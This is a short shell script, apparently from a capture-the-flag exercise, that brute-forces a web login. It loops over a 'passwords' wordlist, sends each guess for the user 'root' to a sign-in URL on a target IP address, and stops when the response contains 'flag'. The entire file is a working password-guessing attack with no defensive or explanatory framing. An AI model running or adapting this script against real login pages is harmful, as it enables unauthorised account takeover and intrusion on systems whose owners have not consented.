#!/bin/sh
length=$(awk 'END{print NR}' passwords)
current=0
ip_address=$1
input="passwords"
while IFS= read -r line
do
    response=$(curl -s "http://$ip_address/?page=signin&username=root&password=$line&Login=Login" | grep "flag")
    echo $response
    if [ ! -z "$response" ]; then
        echo "found password is : $line"
        echo $response
        break
    fi
    current=$((current+1))
    echo "pw: $line || Current progress : $(((current * 100) / length))%\r"
done < "$input"